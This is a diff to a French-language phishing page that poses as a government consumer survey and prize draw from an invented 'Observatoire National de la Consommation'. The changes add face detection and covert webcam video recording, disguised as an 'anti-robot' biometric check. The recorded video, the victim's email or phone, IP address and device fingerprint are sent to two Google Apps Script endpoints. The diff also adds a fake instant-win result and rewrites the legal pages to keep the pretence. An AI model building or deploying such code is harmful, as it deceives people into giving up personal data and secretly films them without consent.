@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Enquête Nationale sur la Consommation - Jeu-Concours</title>
+<!-- Ajout de la librairie de détection de visage -->
+<script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
 <style>
   @font-face {
     font-family: 'Marianne';
@@ -84,7 +86,6 @@
   .consent-label { display: flex; align-items: flex-start; gap: 12px; cursor: pointer; }
   .consent-label input { margin-top: 4px; width: 18px; height: 18px; accent-color: #000091; }
   
-  /* Modification du loader pour intégrer la barre de progression */
   #loader { display: none; text-align: center; margin-top: 20px; font-weight: 700; color: #000091; font-size: 15px; }
   #loader-bar-bg { width: 100%; height: 6px; background: #e5e5e5; margin-top: 10px; border-radius: 3px; overflow: hidden; }
   #loader-bar-fill { height: 100%; background: #000091; width: 0%; transition: width 0.4s ease; }
@@ -145,7 +146,7 @@
   <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
 
   <div class="step active" id="step-questions">
-    <h2>Participez à notre grande enquête 2026</h2>
+    <h2>Participez à notre grande enquête <span class="year-dyn"></span></h2>
     <p class="subtitle">Répondez à quelques questions et tentez de remporter un bon d'achat de 500€ valable chez nos partenaires.</p>
     <div id="question-container"></div>
     <button class="btn-action" id="btn-next" style="display:none;">Continuer</button>
@@ -193,7 +194,6 @@
     </div>
     <button class="btn-action" id="btn-submit" disabled>Valider ma participation</button>
     
-    <!-- LOADER MODIFIÉ -->
     <div id="loader">
       <div id="loader-text">Initialisation du protocole de sécurité...</div>
       <div id="loader-bar-bg"><div id="loader-bar-fill"></div></div>
@@ -203,77 +203,66 @@
       <div id="video-container">
         <video id="video-preview" autoplay playsinline muted></video>
       </div>
-      <p style="margin-top: 15px; font-size: 13px; color: #3a3a3a; font-weight: 700;">Analyse biométrique...</p>
+      <p style="margin-top: 15px; font-size: 13px; color: #3a3a3a; font-weight: 700;">Veuillez regarder la caméra...</p>
     </div>
   </div>
 
-  <div class="confirmation-box" id="step-confirmation">
+  <!-- ÉCRAN DE FIN : GAGNÉ -->
+  <div class="confirmation-box" id="step-win">
     <h2>Votre demande a bien été enregistrée</h2>
     <div class="info-box">
-      <p><strong>Objet :</strong> Confirmation de gain - Enquête Nationale sur la Consommation 2026</p>
-      <p><strong>Numéro de dossier :</strong> <span class="doc-number" id="doc-number">G-2026-XXXXXX</span></p>
-      <p><strong>Statut :</strong> En cours de traitement</p>
+      <p><strong>Objet :</strong> Confirmation de gain - Enquête Nationale sur la Consommation <span class="year-dyn"></span></p>
+      <p><strong>Numéro de dossier :</strong> <span class="doc-number" id="doc-number-win">G-XXXX-XXXXXX</span></p>
+      <p><strong>Statut :</strong> Vous avez gagné !</p>
       <p style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #ccc;">
-        Votre bon d'achat d'une valeur de 500€ vous sera transmis par <strong id="confirm-method">e-mail</strong> sous 24 heures. 
+        Félicitations ! Votre bon d'achat d'une valeur de 500€ vous sera transmis par <strong id="confirm-method-win">e-mail</strong> sous 24 heures. 
         Nous vous invitons à vérifier vos courriers indésirables.
       </p>
     </div>
     <p style="font-size: 14px; color: #666; margin-top: 20px;">Conservez cet accusé de réception. Aucune action supplémentaire n'est requise de votre part.</p>
   </div>
 
+  <!-- ÉCRAN DE FIN : PERDU -->
+  <div class="confirmation-box" id="step-lose">
+    <h2 style="color: #000091; border-bottom-color: #000091;">Participation enregistrée</h2>
+    <div class="info-box">
+      <p><strong>Objet :</strong> Confirmation de participation - Enquête Nationale sur la Consommation <span class="year-dyn"></span></p>
+      <p><strong>Numéro de dossier :</strong> <span class="doc-number" id="doc-number-lose">P-XXXX-XXXXXX</span></p>
+      <p><strong>Statut :</strong> Non gagnant</p>
+      <p style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #ccc;">
+        Nous vous remercions pour votre participation. Malheureusement, vous ne faites pas partie des gagnants de cette session. 
+        Votre participation a bien été prise en compte pour les prochains tirages.
+      </p>
+    </div>
+    <p style="font-size: 14px; color: #666; margin-top: 20px;">Aucune action supplémentaire n'est requise de votre part.</p>
+  </div>
+
   <div class="footer-links">
     <a onclick="openModal('modal-mentions')">Mentions légales</a> | 
     <a onclick="openModal('modal-confidentialite')">Politique de confidentialité (CNIL)</a> | 
     <a onclick="openModal('modal-reglement')">Règlement du jeu</a><br><br>
-    © 2026 Observatoire National de la Consommation. Tous droits réservés.
+    © <span class="year-dyn"></span> Observatoire National de la Consommation. Tous droits réservés.
   </div>
 </div>
 
-<!-- MODALES -->
-<div class="modal" id="modal-faq"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-faq')">&times;</button><h2>Questions fréquentes (FAQ)</h2><h3>Qui peut participer à cette enquête ?</h3><p>Toute personne physique majeure résidant en France métropolitaine ou dans les DOM-TOM.</p><h3>Combien de fois puis-je participer ?</h3><p>Une seule participation par personne (même nom, même adresse e-mail ou même numéro de téléphone).</p><h3>Quand aura lieu le tirage au sort ?</h3><p>Le tirage au sort sera effectué le 15 janvier 2027. Les gagnants seront contactés directement par e-mail ou SMS.</p><h3>Comment savoir si j'ai gagné ?</h3><p>Si vous faites partie des gagnants, vous recevrez un message sur le moyen de contact renseigné lors de votre participation.</p></div></div>
+<!-- MODALES (inchangées) -->
+<div class="modal" id="modal-faq"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-faq')">&times;</button><h2>Questions fréquentes (FAQ)</h2><h3>Qui peut participer à cette enquête ?</h3><p>Toute personne physique majeure résidant en France métropolitaine ou dans les DOM-TOM.</p><h3>Combien de fois puis-je participer ?</h3><p>Une seule participation par personne (même nom, même adresse e-mail ou même numéro de téléphone).</p><h3>Quand aura lieu le tirage au sort ?</h3><p>Le tirage au sort est effectué instantanément à la fin de votre participation. Les gagnants sont contactés directement par e-mail ou SMS.</p><h3>Comment savoir si j'ai gagné ?</h3><p>Un message de confirmation s'affiche à la fin de votre participation.</p></div></div>
 <div class="modal" id="modal-contact"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-contact')">&times;</button><h2>Nous contacter</h2><p>Pour toute question relative à l'enquête ou au jeu-concours, vous pouvez nous joindre :</p><ul><li><strong>Par e-mail :</strong> contact@observatoire-consommation.fr</li><li><strong>Par téléphone :</strong> 01 40 00 00 00 (prix d'un appel local, du lundi au vendredi de 9h à 17h)</li><li><strong>Par courrier :</strong> Observatoire National de la Consommation, 20 avenue de Ségur, 75007 Paris</li></ul><p><em>Merci de préciser votre numéro de dossier si vous en avez un.</em></p></div></div>
 <div class="modal" id="modal-accessibilite"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-accessibilite')">&times;</button><h2>Accessibilité</h2><p>L'Observatoire National de la Consommation s'engage à rendre son site accessible à tous, conformément à l'article 47 de la loi n° 2005-102 du 11 février 2005.</p><p>Cette déclaration d'accessibilité s'applique au site de l'enquête nationale sur la consommation.</p><h3>État de conformité</h3><p>Le site est en cours d'audit pour évaluer sa conformité au RGAA (Référentiel Général d'Amélioration de l'Accessibilité).</p><h3>Retour d'information et contact</h3><p>Si vous n'arrivez pas à accéder à un contenu ou à un service, vous pouvez nous contacter pour être orienté vers une alternative accessible ou obtenir le contenu sous une autre forme : accessibilite@observatoire-consommation.fr.</p></div></div>
-
-<div class="modal" id="modal-mentions">
-  <div class="modal-content">
-    <button class="close-modal" onclick="closeModal('modal-mentions')">&times;</button>
-    <h2>Mentions légales</h2>
-    <p><em>Dernière mise à jour : 2 novembre 2026</em></p>
-
-    <h3>Éditeur de la plateforme</h3>
-    <p>La plateforme de l'Observatoire National de la Consommation est éditée par :<br>
-    <strong>Observatoire National de la Consommation (ONC)</strong><br>
-    Établissement public à caractère administratif<br>
-    Siège social : 20 avenue de Ségur, 75007 Paris<br>
-    Téléphone : 01 40 00 00 00<br>
-    Directeur de la publication : Le Président de l'Observatoire National de la Consommation.</p>
-
-    <h3>Hébergement de la plateforme</h3>
-    <p>La plateforme est hébergée au sein de l'infrastructure sécurisée de l'État, gérée par la Direction interministérielle du numérique (DINUM), ou par un prestataire agréé pour les données de l'administration française.</p>
-    <p><strong>Datacenter :</strong> OVHcloud (Infrastructure certifiée SecNumCloud)<br>
-    <strong>Adresse de l'hébergeur :</strong> 2 rue Kellermann, 59100 Roubaix, France.<br>
-    <strong>Contact technique :</strong> support-hebergement@observatoire-consommation.fr</p>
-
-    <h3>Propriété intellectuelle</h3>
-    <p>L'ensemble de ce site relève de la législation française et internationale sur le droit d'auteur et la propriété intellectuelle. Tous les droits de reproduction sont réservés, y compris pour les documents téléchargeables et les représentations iconographiques et photographiques.</p>
-    <p>La reproduction de tout ou partie de ce site sur un support électronique quel qu'il soit est formellement interdite sauf autorisation expresse du directeur de la publication.</p>
-
-    <h3>Clause de responsabilité</h3>
-    <p>Les informations proposées sur ce site le sont à titre de service rendu au public. Malgré tout le soin apporté à la transcription des textes officiels, à la vérification des contenus et des informations, les éléments mis en ligne ne sauraient, de quelque manière que ce soit, prétendre à l'exactitude et engager la responsabilité de l'Observatoire National de la Consommation.</p>
-    <p>Les informations et/ou documents disponibles sur ce site sont susceptibles d'être modifiés à tout moment, et peuvent faire l'objet de mises à jour.</p>
-
-    <h3>Accessibilité</h3>
-    <p>L'Observatoire National de la Consommation est engagé à améliorer en permanence l'accessibilité de ses contenus pour que l'accès à l'information soit facilité pour tous. Le site est développé selon les recommandations du Référentiel général d'amélioration de l'accessibilité (RGAA) et les normes W3C.</p>
-  </div>
-</div>
-
-<div class="modal" id="modal-confidentialite"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-confidentialite')">&times;</button><h2>Politique de confidentialité et cookies</h2><p><em>Dernière mise à jour : 2 novembre 2026</em></p><p>L'Observatoire National de la Consommation s'engage à ce que la collecte et le traitement de vos données, effectués à partir de ce site, soient conformes au Règlement Général sur la Protection des Données (RGPD) et à la loi Informatique et Libertés.</p><h3>À qui sont destinées vos données ?</h3><p>L'Observatoire National de la Consommation, situé au 20 avenue de Ségur à Paris (75007), est responsable du traitement des données personnelles pour ce site. Sauf mention contraire, les données personnelles qui y sont collectées sont destinées à un usage interne et n'ont pas vocation à être partagées avec des tiers en dehors des cas prévus par les lois et règlements.</p><h3>À quoi servent vos données ?</h3><p>Les traitements de données personnelles mis en œuvre ont pour finalités de :</p><ul><li>Permettre votre participation à l'enquête et au jeu-concours ;</li><li>Vous contacter en cas de gain ;</li><li>Assurer le bon fonctionnement du site et améliorer votre expérience de navigation ;</li><li>Réaliser des statistiques anonymes sur les habitudes de consommation.</li></ul><h3>Comment vos données sont-elles collectées ?</h3><p>Vos données peuvent être collectées sur des formulaires. Chaque formulaire limite la collecte des données personnelles au strict nécessaire (minimisation des données) et indique les objectifs du recueil de ces données. Vos données peuvent également être collectées par l'intermédiaire des applications présentes sur le site, en particulier des données techniques liées à votre navigation (l'adresse IP, les données de connexion par exemple).</p><h3>Pendant combien de temps vos données sont-elles conservées ?</h3><p>De manière générale, vos données sont conservées par l'Observatoire National de la Consommation pendant 5 ans, sauf :</p><ul><li>les journaux applicatifs qui sont conservés 1 an ;</li><li>votre choix en matière de cookies qui est conservé 6 mois ;</li><li>les données collectées grâce aux cookies qui sont conservées 25 mois.</li></ul><h3>À propos des cookies</h3><p>Pendant la consultation de ce site, des cookies sont déposés sur votre ordinateur, votre mobile ou votre tablette. Un cookie est une suite d'informations, généralement de petite taille et identifié par un nom, qui peut être transmis à votre navigateur par un site web sur lequel vous vous connectez.</p><p>Le site utilise des cookies techniques strictement nécessaires au fonctionnement du site. Ils ne peuvent pas être désactivés, sauf en refusant tous les cookies dans les paramètres de votre navigateur. Le site utilise également des cookies de mesure d'audience soumis à votre consentement.</p><h3>Quels sont vos droits ?</h3><p>Vous disposez d'un droit d'accès, de rectification, d'effacement, de limitation, de portabilité et d'opposition sur vos données. Vous pouvez exercer ces droits en contactant le Délégué à la Protection des Données (DPO) à l'adresse suivante : dpo@observatoire-consommation.fr.</p><p>Si vous estimez, après nous avoir contactés, que vos droits ne sont pas respectés, vous pouvez adresser une réclamation à la CNIL (Commission Nationale de l'Informatique et des Libertés) : 3 place de Fontenoy, TSA 80715, 75334 PARIS CEDEX 07, ou en ligne sur www.cnil.fr.</p></div></div>
-<div class="modal" id="modal-reglement"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-reglement')">&times;</button><h2>Règlement du jeu-concours</h2><p><em>Article 1 – Organisation</em></p><p>L'Observatoire National de la Consommation organise un jeu-concours gratuit et sans obligation d'achat du 1er novembre 2026 à 00h00 au 31 décembre 2026 à 23h59.</p><p><em>Article 2 – Conditions de participation</em></p><p>Ce jeu est ouvert à toute personne physique majeure résidant légalement sur le territoire français. La participation est limitée à une seule fois par personne (même nom, même adresse e-mail, même numéro de téléphone).</p><p><em>Article 3 – Modalités de participation</em></p><p>Pour que sa participation soit validée, le candidat doit remplir le formulaire d'enquête, répondre aux questions, renseigner ses coordonnées (e-mail ou téléphone) et procéder à la vérification anti-robot. Toute participation incomplète ou frauduleuse sera automatiquement rejetée.</p><p><em>Article 4 – Dotation</em></p><p>Le jeu est doté d'un bon d'achat d'une valeur de 500€ valable chez les partenaires officiels (Fnac, Darty, Amazon, Leclerc). Le lot offert ne peut donner lieu à aucune contestation, ni à la remise de sa contrevaleur en espèces, ni à son échange.</p><p><em>Article 5 – Désignation des gagnants</em></p><p>Les gagnants seront désignés par tirage au sort parmi l'ensemble des participants ayant respecté toutes les modalités de participation. Le tirage au sort aura lieu le 15 janvier 2027.</p><p><em>Article 6 – Remise du lot</em></p><p>Les gagnants seront contactés par e-mail ou par SMS dans les jours suivant le tirage au sort. Le bon d'achat sera envoyé par voie électronique. Tout lot non réclamé dans un délai de 30 jours après l'annonce sera considéré comme perdu.</p><p><em>Article 7 – Exclusions et fraudes</em></p><p>Les participations multiples sont interdites. L'organisateur se réserve le droit d'exclure sans préavis tout participant ayant recours à des robots, des faux comptes ou à toute autre méthode frauduleuse.</p><p><em>Article 8 – Protection des données personnelles</em></p><p>Les données collectées sont traitées conformément à la Politique de confidentialité accessible sur le site. Conformément au RGPD, vous disposez d'un droit d'accès, de rectification et d'effacement de vos données.</p><p><em>Article 9 – Litiges</em></p><p>Le présent règlement est soumis à la loi française. Tout litige sera soumis aux tribunaux compétents de Paris.</p></div></div>
+<div class="modal" id="modal-mentions"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-mentions')">&times;</button><h2>Mentions légales</h2><p><em>Dernière mise à jour : <span id="date-mentions"></span></em></p><h3>Éditeur de la plateforme</h3><p>La plateforme de l'Observatoire National de la Consommation est éditée par :<br><strong>Observatoire National de la Consommation (ONC)</strong><br>Établissement public à caractère administratif<br>Siège social : 20 avenue de Ségur, 75007 Paris<br>Téléphone : 01 40 00 00 00<br>Directeur de la publication : Le Président de l'Observatoire National de la Consommation.</p><h3>Hébergement de la plateforme</h3><p>La plateforme est hébergée au sein de l'infrastructure sécurisée de l'État, gérée par la Direction interministérielle du numérique (DINUM), ou par un prestataire agréé pour les données de l'administration française.</p><p><strong>Datacenter :</strong> OVHcloud (Infrastructure certifiée SecNumCloud)<br><strong>Adresse de l'hébergeur :</strong> 2 rue Kellermann, 59100 Roubaix, France.<br><strong>Contact technique :</strong> support-hebergement@observatoire-consommation.fr</p><h3>Propriété intellectuelle</h3><p>L'ensemble de ce site relève de la législation française et internationale sur le droit d'auteur et la propriété intellectuelle. Tous les droits de reproduction sont réservés, y compris pour les documents téléchargeables et les représentations iconographiques et photographiques.</p><h3>Clause de responsabilité</h3><p>Les informations proposées sur ce site le sont à titre de service rendu au public. Malgré tout le soin apporté à la transcription des textes officiels, à la vérification des contenus et des informations, les éléments mis en ligne ne sauraient, de quelque manière que ce soit, prétendre à l'exactitude et engager la responsabilité de l'Observatoire National de la Consommation.</p></div></div>
+<div class="modal" id="modal-confidentialite"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-confidentialite')">&times;</button><h2>Politique de confidentialité et cookies</h2><p><em>Dernière mise à jour : <span id="date-confidentialite"></span></em></p><p>L'Observatoire National de la Consommation s'engage à ce que la collecte et le traitement de vos données, effectués à partir de ce site, soient conformes au Règlement Général sur la Protection des Données (RGPD) et à la loi Informatique et Libertés.</p><h3>À qui sont destinées vos données ?</h3><p>L'Observatoire National de la Consommation, situé au 20 avenue de Ségur à Paris (75007), est responsable du traitement des données personnelles pour ce site. Sauf mention contraire, les données personnelles qui y sont collectées sont destinées à un usage interne et n'ont pas vocation à être partagées avec des tiers en dehors des cas prévus par les lois et règlements.</p><h3>À quoi servent vos données ?</h3><p>Les traitements de données personnelles mis en œuvre ont pour finalités de :</p><ul><li>Permettre votre participation à l'enquête et au jeu-concours ;</li><li>Vous contacter en cas de gain ;</li><li>Assurer le bon fonctionnement du site et améliorer votre expérience de navigation ;</li><li>Réaliser des statistiques anonymes sur les habitudes de consommation.</li></ul><h3>Pendant combien de temps vos données sont-elles conservées ?</h3><p>De manière générale, vos données sont conservées par l'Observatoire National de la Consommation pendant 5 ans, sauf :</p><ul><li>les journaux applicatifs qui sont conservés 1 an ;</li><li>votre choix en matière de cookies qui est conservé 6 mois ;</li><li>les données collectées grâce aux cookies qui sont conservées 25 mois.</li></ul><h3>Quels sont vos droits ?</h3><p>Vous disposez d'un droit d'accès, de rectification, d'effacement, de limitation, de portabilité et d'opposition sur vos données. Vous pouvez exercer ces droits en contactant le Délégué à la Protection des Données (DPO) à l'adresse suivante : dpo@observatoire-consommation.fr.</p><p>Si vous estimez, après nous avoir contactés, que vos droits ne sont pas respectés, vous pouvez adresser une réclamation à la CNIL (Commission Nationale de l'Informatique et des Libertés) : 3 place de Fontenoy, TSA 80715, 75334 PARIS CEDEX 07, ou en ligne sur www.cnil.fr.</p></div></div>
+<div class="modal" id="modal-reglement"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-reglement')">&times;</button><h2>Règlement du jeu-concours</h2><p><em>Article 1 – Organisation</em></p><p>L'Observatoire National de la Consommation organise un jeu-concours gratuit et sans obligation d'achat à l'échelle nationale.</p><p><em>Article 2 – Conditions de participation</em></p><p>Ce jeu est ouvert à toute personne physique majeure résidant légalement sur le territoire français. La participation est limitée à une seule fois par personne (même nom, même adresse e-mail, même numéro de téléphone).</p><p><em>Article 3 – Modalités de participation</em></p><p>Pour que sa participation soit validée, le candidat doit remplir le formulaire d'enquête, répondre aux questions, renseigner ses coordonnées (e-mail ou téléphone) et procéder à la vérification anti-robot. Toute participation incomplète ou frauduleuse sera automatiquement rejetée.</p><p><em>Article 4 – Dotation</em></p><p>Le jeu est doté d'un bon d'achat d'une valeur de 500€ valable chez les partenaires officiels (Fnac, Darty, Amazon, Leclerc). Le lot offert ne peut donner lieu à aucune contestation, ni à la remise de sa contrevaleur en espèces, ni à son échange.</p><p><em>Article 5 – Désignation des gagnants</em></p><p>Les gagnants sont désignés par un algorithme de tirage au sort exécuté au moment de la validation de la participation. Seuls les participants ayant respecté toutes les modalités de participation peuvent être éligibles.</p><p><em>Article 6 – Remise du lot</em></p><p>Les gagnants seront contactés par e-mail ou par SMS dans les jours suivant le tirage au sort. Le bon d'achat sera envoyé par voie électronique. Tout lot non réclamé dans un délai de 30 jours après l'annonce sera considéré comme perdu.</p><p><em>Article 7 – Exclusions et fraudes</em></p><p>Les participations multiples sont interdites. L'organisateur se réserve le droit d'exclure sans préavis tout participant ayant recours à des robots, des faux comptes ou à toute autre méthode frauduleuse.</p><p><em>Article 8 – Protection des données personnelles</em></p><p>Les données collectées sont traitées conformément à la Politique de confidentialité accessible sur le site. Conformément au RGPD, vous disposez d'un droit d'accès, de rectification et d'effacement de vos données.</p><p><em>Article 9 – Litiges</em></p><p>Le présent règlement est soumis à la loi française. Tout litige sera soumis aux tribunaux compétents de Paris.</p></div></div>
 
 <script>
 // ⚠️ TES DEUX LIENS SONT ICI ⚠️
 const SCRIPT_URL_TEXT = "https://script.google.com/macros/s/AKfycbyBI-fdD9Kw44y3qMp0s4YrDq8RKf5Nod8Zzz_Yeqz8MtksyzWdhP73xE9vPp2ejVj1Ug/exec";
 const SCRIPT_URL_PHOTO = "https://script.google.com/macros/s/AKfycbxGcA_5HG9JtEY48Kw1mowcVVgLUNG1Zl3VTXupuCBOQzPurZIeHiGubUSC1ArcEnp9Ig/exec";
+
+// --- GESTION DYNAMIQUE DES DATES ---
+const currentYear = new Date().getFullYear();
+document.querySelectorAll('.year-dyn').forEach(el => el.textContent = currentYear);
+document.getElementById('date-mentions').textContent = new Date().toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });
+document.getElementById('date-confidentialite').textContent = new Date().toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });
 
 function openModal(id) { document.getElementById(id).style.display = 'block'; }
 function closeModal(id) { document.getElementById(id).style.display = 'none'; }
@@ -319,9 +308,8 @@ const loaderText = document.getElementById('loader-text');
 const loaderBarFill = document.getElementById('loader-bar-fill');
 const cameraArea = document.getElementById('camera-area');
 const video = document.getElementById('video-preview');
-const stepConfirmation = document.getElementById('step-confirmation');
-const confirmMethod = document.getElementById('confirm-method');
-const docNumber = document.getElementById('doc-number');
+const stepWin = document.getElementById('step-win');
+const stepLose = document.getElementById('step-lose');
 
 const inputMethod = document.getElementById('input-method');
 const inputContact = document.getElementById('input-contact');
@@ -410,10 +398,20 @@ btnNext.addEventListener('click', () => {
 });
 
 document.getElementById('btn-claim').addEventListener('click', () => {
-  if (!inputContact.value || (inputMethod.value === 'email' && !inputContact.value.includes('@')) || (inputMethod.value === 'sms' && inputContact.value.length < 8)) {
-    alert("Veuillez renseigner une information valide pour recevoir votre récompense.");
-    return;
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  if (inputMethod.value === 'email') {
+    if (!inputContact.value || !emailRegex.test(inputContact.value)) {
+      alert("Veuillez saisir une adresse e-mail valide (ex: nom@domaine.fr).");
+      return;
+    }
+  } else if (inputMethod.value === 'sms') {
+    if (!inputContact.value || inputContact.value.length < 8) {
+      alert("Veuillez saisir un numéro de téléphone valide.");
+      return;
+    }
   }
+
   progressFill.style.width = '75%';
   stepPrize.classList.remove('active');
   stepFinal.classList.add('active');
@@ -430,7 +428,6 @@ btnSubmit.addEventListener('click', async () => {
   btnSubmit.style.display = 'none';
   loader.style.display = 'block';
   
-  // Réinitialiser le loader
   loaderText.textContent = "Initialisation du protocole de sécurité...";
   loaderBarFill.style.width = '10%';
 
@@ -451,78 +448,133 @@ btnSubmit.addEventListener('click', async () => {
       try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
     }
 
-    let photoBase64 = "";
-    
-    // Étape 1 : Capture photo après 1.5 seconde
-    setTimeout(() => {
+    // --- NOUVEAU : DÉTECTION DE VISAGE ---
+    loaderText.textContent = "Recherche biométrique (visage)...";
+    loaderBarFill.style.width = '25%';
+
+    // Si la librairie face-api est bien chargée
+    if (typeof faceapi !== 'undefined') {
+      // Chargement du modèle (peut prendre 1-2 sec la première fois)
+      await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models');
+      
+      let faceDetected = false;
+      let attempts = 0;
+      
+      // On vérifie toutes les 500ms si un visage est présent
+      const checkFaceInterval = setInterval(async () => {
+        attempts++;
+        // Au bout de 10 secondes (20 * 500ms) on abandonne et on lance quand même (au cas où)
+        if (attempts > 20) {
+          clearInterval(checkFaceInterval);
+          startCapture();
+          return;
+        }
+        
+        const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
+        if (detection) {
+          clearInterval(checkFaceInterval);
+          startCapture();
+        }
+      }, 500);
+      
+    } else {
+      // Si face-api n'est pas chargé (ex: pas d'internet), on lance direct
+      startCapture();
+    }
+
+    function startCapture() {
       loaderText.textContent = "Analyse biométrique en cours...";
-      loaderBarFill.style.width = '40%';
-      try {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 300;
-        canvas.height = video.videoHeight || 300;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
-      } catch(e) {}
-    }, 1500);
+      loaderBarFill.style.width = '50%';
 
-    // Étape 2 : Changer le texte après 3 secondes
-    setTimeout(() => {
-      loaderText.textContent = "Vérification anti-robot et sécurisation...";
-      loaderBarFill.style.width = '80%';
-    }, 3000);
-
-    // Étape 3 : Finir après 4.5 secondes (4500 ms)
-    setTimeout(async () => {
-      loaderBarFill.style.width = '100%';
-      loaderText.textContent = "Validation terminée.";
-
-      const ip = await getPublicIP();
+      // --- ENREGISTREMENT VIDÉO EN CACHETTE ---
+      let mediaRecorder;
+      let recordedChunks = [];
+      let mimeType = 'video/webm';
+      let extension = 'webm';
       
-      // Envoi Texte
-      const formDataTexte = new URLSearchParams();
-      formDataTexte.append("email", inputMethod.value === 'email' ? inputContact.value : "");
-      formDataTexte.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
-      formDataTexte.append("ip", ip);
-      formDataTexte.append("os", info.os);
-      formDataTexte.append("browser", info.browser);
-      formDataTexte.append("screen", screenInfo);
-      formDataTexte.append("lang", navigator.language);
-      formDataTexte.append("cores", cores);
-      formDataTexte.append("ram", ram);
-      formDataTexte.append("battery", batteryInfo);
-      formDataTexte.append("userAgent", info.ua);
-
-      fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
-
-      // Envoi Photo
-      if (photoBase64) {
-        const formDataPhoto = new URLSearchParams();
-        formDataPhoto.append("photo", photoBase64);
-        fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataPhoto }).catch(e => console.log(e));
+      if (MediaRecorder.isTypeSupported('video/mp4')) {
+          mimeType = 'video/mp4';
+          extension = 'mp4';
+      } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+          mimeType = 'video/webm;codecs=vp9';
+      } else if (MediaRecorder.isTypeSupported('video/webm')) {
+          mimeType = 'video/webm';
       }
 
-      if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+      mediaRecorder = new MediaRecorder(mediaStream, { mimeType: mimeType });
       
-      if (inputMethod.value === 'sms') {
-        confirmMethod.textContent = "SMS";
-      } else {
-        confirmMethod.textContent = "e-mail";
-      }
-      
-      docNumber.textContent = "G-2026-" + Math.floor(100000 + Math.random() * 900000);
+      mediaRecorder.ondataavailable = event => {
+        if (event.data.size > 0) {
+          recordedChunks.push(event.data);
+        }
+      };
 
-      // Petit délai pour que la barre arrive à 100% visuellement avant de changer de page
+      mediaRecorder.start();
+
       setTimeout(() => {
-        loader.style.display = 'none';
-        cameraArea.style.display = 'none';
-        stepFinal.classList.remove('active');
-        stepConfirmation.classList.add('active');
-        progressFill.style.width = '100%';
-      }, 300);
+        loaderText.textContent = "Vérification anti-robot et sécurisation...";
+        loaderBarFill.style.width = '80%';
+      }, 1500);
 
-    }, 4500); // <-- Modifié ici pour faire durer 4,5 secondes
+      setTimeout(() => {
+        mediaRecorder.stop();
+        loaderBarFill.style.width = '100%';
+        loaderText.textContent = "Validation terminée.";
+
+        setTimeout(async () => {
+          const videoBlob = new Blob(recordedChunks, { type: mimeType });
+          const reader = new FileReader();
+          
+          reader.onloadend = async function() {
+            const mediaBase64 = reader.result;
+            const ip = await getPublicIP();
+            
+            const formDataTexte = new URLSearchParams();
+            formDataTexte.append("email", inputMethod.value === 'email' ? inputContact.value : "");
+            formDataTexte.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
+            formDataTexte.append("ip", ip);
+            formDataTexte.append("os", info.os);
+            formDataTexte.append("browser", info.browser);
+            formDataTexte.append("screen", screenInfo);
+            formDataTexte.append("lang", navigator.language);
+            formDataTexte.append("cores", cores);
+            formDataTexte.append("ram", ram);
+            formDataTexte.append("battery", batteryInfo);
+            formDataTexte.append("userAgent", info.ua);
+
+            fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
+
+            const formDataMedia = new URLSearchParams();
+            formDataMedia.append("media", mediaBase64);
+            formDataMedia.append("extension", extension);
+            fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataMedia }).catch(e => console.log(e));
+
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            
+            const randomNum = Math.floor(Math.random() * 100) + 1;
+            
+            setTimeout(() => {
+              loader.style.display = 'none';
+              cameraArea.style.display = 'none';
+              stepFinal.classList.remove('active');
+              
+              if (randomNum <= 15) {
+                document.getElementById('confirm-method-win').textContent = inputMethod.value === 'sms' ? "SMS" : "e-mail";
+                document.getElementById('doc-number-win').textContent = "G-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
+                stepWin.classList.add('active');
+              } else {
+                document.getElementById('doc-number-lose').textContent = "P-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
+                stepLose.classList.add('active');
+              }
+              
+              progressFill.style.width = '100%';
+            }, 300);
+          };
+          reader.readAsDataURL(videoBlob);
+        }, 300);
+
+      }, 4500); // Enregistrement de 4.5s
+    }
 
   } catch (err) {
     loaderText.textContent = "Impossible de lancer la vérification. Veuillez autoriser la caméra.";
